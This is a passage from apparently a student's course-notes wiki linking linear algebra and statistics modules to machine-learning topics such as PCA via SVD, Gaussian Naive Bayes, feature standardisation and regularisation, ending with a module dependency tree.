The INF2008 PCA algorithm (standardise → covariance → eigendecompose → project) and the SVD route arrive at the same principal components. SVD is simply more numerically stable and works on any m × n matrix, not just square covariance matrices.

### Rank-k approximation and dimensionality reduction

The SVD low-rank approximation:

$$A \approx \sum_{i=1}^{k} \sigma_i\, \mathbf{u}_i\, \mathbf{v}_i^T$$

is the mathematical statement of what PCA does when you select k principal components: you retain the k directions of greatest variance and discard the rest.

---

## 3. Probability Distributions → Bayesian Classifiers and Model Evaluation

### Gaussian Naive Bayes

Naive Bayes classifies by computing the posterior $P(class \mid features)$ via Bayes' theorem:

$$P(class \mid x) \propto P(class) \cdot P(x \mid class)$$

The Gaussian variant assumes features follow a Normal distribution within each class — a direct application of $X \sim N(\mu, \sigma^2)$ from [[concepts/probability-distributions|Probability Distributions]]. The likelihood $P(x_j \mid class)$ is evaluated using the Gaussian PDF:

$$f(x) = \frac{1}{\sigma\sqrt{2\pi}} e^{-\frac{(x-\mu)^2}{2\sigma^2}}$$

The prior $P(class)$ is the class frequency in the training data — the law of large numbers at work.

### Distribution of model errors

When evaluating a regression model, the residuals $e_i = y_i - \hat{y}_i$ are assumed to be normally distributed with mean zero and constant variance (homoscedasticity). This assumption justifies minimising MSE as a loss function: it is the maximum-likelihood estimator under a Gaussian error model. The CLT also explains why large-sample performance metrics (mean accuracy, mean F1 across cross-validation folds) behave predictably — they are sample means of identically distributed random variables.

---

## 4. Descriptive Statistics → Feature Scaling and Data Understanding

### Mean and variance in CRISP-DM phase 2

The CRISP-DM Data Understanding phase asks: what is the distribution of each feature? This is answered directly by the summary statistics from INF1003: mean $\mu$, variance $\sigma^2$, and standard deviation $\sigma$. Outliers are spotted as values beyond $\mu \pm 3\sigma$ (the 99.7% rule for Normal distributions).

### Feature scaling as standardisation

PCA, k-NN, K-Means, and SVMs all require features to be on comparable scales. The standardisation step in PCA:

$$X_{scaled} = \frac{X - \bar{X}}{\sigma}$$

is exactly the Z-score transformation from INF1004:

$$Z = \frac{X - \mu}{\sigma}$$

The reason it is required is stated in [[concepts/clustering-and-dimensionality-reduction|Clustering & Dimensionality Reduction]]: "features with larger numeric ranges dominate distance calculations." Variance, as defined in INF1004, is what PCA maximises — so an unscaled feature with large numeric values would trivially dominate the first principal component.

---

## 5. Where ML Goes Beyond the Maths Modules

The maths modules are necessary but not sufficient. Several INF2008 topics require knowledge that INF1003/INF1004 does not fully provide:

| ML Concept | Mathematical Basis | Coverage in INF1003/INF1004 |
|---|---|---|
| Gradient descent | Multivariate calculus (partial derivatives, chain rule) | Not covered — introduced directly in INF2008 |
| Cross-entropy loss | Information theory; logarithms of probabilities | Logarithms covered; information theory not |
| L1/L2 regularisation | L1 norm (sum of absolute values), L2 norm (Euclidean length) | Vector magnitudes and norms covered partially |
| Backpropagation | Chain rule over a computation graph | Chain rule not covered |
| t-SNE | KL divergence, Student's t-distribution | t-distribution not covered; KL divergence not covered |

The regularisation gap is worth noting explicitly. Ridge regression adds $\lambda \|w\|_2^2$ to the loss, and Lasso adds $\lambda \|w\|_1$ — both norms are defined in terms of vector magnitude, which INF1004 covers (magnitude $|\mathbf{v}| = \sqrt{\sum v_i^2}$), but the norm notation and its role in penalisation are introduced only in INF2008.

---

## 6. Module Dependency Summary

```
INF1004: Linear Algebra & Matrices
  ├── dot products, matrix multiplication  ──→  forward pass in neural networks
  ├── OLS solution (X^TX)^{-1}X^Ty        ──→  closed-form linear regression
  └── determinants, inverses               ──→  matrix operations in data preprocessing

INF1004: Eigenvalues & SVD
  ├── eigendecomposition                   ──→  PCA (covariance matrix route)
  └── SVD (A = UΣV^T)                     ──→  PCA (numerically stable route)

INF1004 / INF1003: Probability & Statistics
  ├── Normal distribution                  ──→  Gaussian Naive Bayes likelihood
  ├── mean, variance                       ──→  feature standardisation, Z-score scaling
  ├── Law of Large Numbers                 ──→  prior probabilities from class frequencies
  └── CLT                                  ──→  confidence in cross-validated metrics
```

---

## See Also

- [[concepts/linear-algebra-matrices|Linear Algebra & Matrices]] — matrix multiplication, dot products, OLS solution
- [[concepts/eigenvalues-and-svd|Eigenvalues, Diagonalisation & SVD]] — eigendecomposition, SVD computation, rank-k approximation
- [[concepts/probability-distributions|Probability Distributions]] — Normal distribution, mean, variance, CLT
- [[concepts/ml-foundations|Machine Learning Foundations]] — CRISP-DM, supervised vs unsupervised framing
- [[concepts/neural-networks-linear-models|Neural Networks & Linear Models]] — forward pass, gradient descent, backpropagation
- [[concepts/clustering-and-dimensionality-reduction|Clustering & Dimensionality Reduction]] — PCA step-by-step, t-SNE, feature scaling requirement
